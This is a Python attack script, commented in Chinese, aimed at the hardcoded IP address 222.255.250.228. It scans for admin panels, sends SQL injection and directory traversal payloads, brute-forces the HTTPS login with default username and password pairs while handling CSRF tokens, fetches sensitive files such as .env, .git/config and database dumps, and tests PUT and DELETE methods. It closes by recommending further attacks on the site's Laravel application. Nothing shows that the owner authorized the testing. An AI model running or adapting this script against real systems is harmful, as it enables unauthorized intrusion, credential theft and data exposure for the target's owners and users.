#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
222.255.250.228 漏洞检测和利用尝试
"""

import requests
import urllib3
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "222.255.250.228"

print(f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    目标漏洞检测: {TARGET}                                  ║
║                    时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                                   ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")

# 1. 检查具体的管理后台
print("\n[1] 管理后台分析")
admin_urls = [
    f"http://{TARGET}/admin",
    f"http://{TARGET}/admin/dashboard",
    f"https://{TARGET}/admin",
    f"http://{TARGET}/swagger"
]

for url in admin_urls:
    try:
        resp = requests.get(url, verify=False, timeout=5, allow_redirects=False)
        print(f"[*] {url}")
        print(f"    状态: {resp.status_code}")
        
        if resp.status_code == 200:
            # 查看页面内容
            if 'login' in resp.text.lower() or 'password' in resp.text.lower():
                print(f"    [!] 发现登录页面")
                
                # 提取表单信息
                if '<form' in resp.text:
                    # 查找 action
                    import re
                    action_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
                    if action_match:
                        print(f"    [!] 表单提交地址: {action_match.group(1)}")
                    
                    # 查找输入字段
                    inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
                    if inputs:
                        print(f"    [!] 表单字段: {', '.join(set(inputs))}")
                        
            elif 'swagger' in resp.text.lower() or 'api' in resp.text.lower():
                print(f"    [!] 可能是 API 文档")
                
    except Exception as e:
        print(f"    [X] 错误: {str(e)[:50]}")

# 2. SQL 注入测试
print("\n\n[2] SQL 注入基础测试")
sql_payloads = [
    "'", '"', "' OR '1'='1", "admin' --", "1' OR 1=1 --"
]

test_urls = [
    f"http://{TARGET}/login",
    f"http://{TARGET}/admin/login",
    f"https://{TARGET}/login"
]

for base_url in test_urls:
    print(f"\n[*] 测试: {base_url}")
    for payload in sql_payloads[:2]:  # 只测试基础 payload
        try:
            # GET 参数测试
            test_url = f"{base_url}?username={payload}&password=test"
            resp = requests.get(test_url, verify=False, timeout=3)
            
            # 检查错误信息
            error_keywords = ['sql', 'mysql', 'syntax', 'error', 'exception', 'warning']
            for keyword in error_keywords:
                if keyword in resp.text.lower():
                    print(f"    [!] 可能存在 SQL 注入 (GET): {payload}")
                    print(f"        错误关键词: {keyword}")
                    break
                    
        except:
            pass

# 3. 目录遍历测试
print("\n\n[3] 目录遍历测试")
traversal_payloads = [
    "../", "..\\", "....//", "..%2f", "..%5c",
    "../etc/passwd", "..\\windows\\win.ini"
]

for payload in traversal_payloads[:3]:
    try:
        url = f"http://{TARGET}/admin?file={payload}"
        resp = requests.get(url, verify=False, timeout=3)
        
        if 'root:' in resp.text or '[fonts]' in resp.text:
            print(f"    [!] 目录遍历漏洞: {payload}")
        
    except:
        pass

# 4. 弱口令测试
print("\n\n[4] 弱口令测试")
common_passwords = [
    ('admin', 'admin'), ('admin', '123456'), ('admin', 'password'),
    ('admin', 'admin123'), ('admin', 'admin@123'), ('admin', 'P@ssw0rd'),
    ('administrator', 'password'), ('root', 'root'), ('sa', 'sa'),
    ('admin', 'ems'), ('admin', 'ems123'), ('admin', 'ems@123'),
    ('ems', 'ems'), ('ems', '123456'), ('admin', '1234567890')
]

# 测试 HTTPS 登录
login_url = f"https://{TARGET}/login"
print(f"\n[*] 测试登录: {login_url}")

# 先获取登录页面，提取 CSRF token
try:
    session = requests.Session()
    resp = session.get(login_url, verify=False)
    
    # 查找 CSRF token
    csrf_token = None
    if '_token' in resp.text:
        import re
        token_match = re.search(r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']', resp.text)
        if token_match:
            csrf_token = token_match.group(1)
            print(f"    [*] CSRF Token: {csrf_token[:20]}...")
    
    # 尝试登录
    for username, password in common_passwords[:5]:  # 只测试前5个
        data = {
            'email': username,
            'password': password
        }
        
        if csrf_token:
            data['_token'] = csrf_token
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': login_url
        }
        
        resp = session.post(login_url, data=data, headers=headers, verify=False, allow_redirects=False)
        
        print(f"    测试: {username}:{password} - 状态: {resp.status_code}")
        
        # 检查登录成功的标志
        if resp.status_code in [302, 301]:
            location = resp.headers.get('Location', '')
            if 'dashboard' in location or 'home' in location:
                print(f"    [!!!] 可能的有效凭证: {username}:{password}")
                print(f"    [!!!] 重定向到: {location}")
                break
                
except Exception as e:
    print(f"    [X] 错误: {str(e)}")

# 5. 信息泄露检查
print("\n\n[5] 敏感信息泄露检查")
sensitive_files = [
    '/.git/config', '/.env', '/config.php', '/web.config',
    '/phpinfo.php', '/info.php', '/test.php', '/backup.sql',
    '/database.sql', '/db.sql', '/.DS_Store', '/Thumbs.db'
]

for file in sensitive_files:
    for protocol in ['http', 'https']:
        url = f"{protocol}://{TARGET}{file}"
        try:
            resp = requests.get(url, verify=False, timeout=3, allow_redirects=False)
            if resp.status_code == 200:
                print(f"    [!] 敏感文件泄露: {url}")
                print(f"        内容预览: {resp.text[:100]}...")
            elif resp.status_code == 403:
                print(f"    [*] 文件存在但禁止访问: {url}")
                
        except:
            pass

# 6. HTTP 方法测试
print("\n\n[6] HTTP 方法测试")
methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'PATCH']
test_url = f"http://{TARGET}/admin"

for method in methods:
    try:
        resp = requests.request(method, test_url, verify=False, timeout=3)
        if resp.status_code != 405:  # Method Not Allowed
            print(f"    [*] {method}: {resp.status_code}")
            if method in ['PUT', 'DELETE']:
                print(f"        [!] 危险方法启用!")
                
    except:
        pass

print("\n\n[+] 检测完成！")
print("\n建议:")
print("1. 重点关注 HTTPS (443) 上的 Laravel 应用")
print("2. HTTP (80) 上运行着不同的 ASP.NET 应用")
print("3. 存在多个管理后台入口")
print("4. 建议进一步测试 Laravel 框架相关漏洞")
print("5. 检查 /swagger 接口是否暴露敏感 API")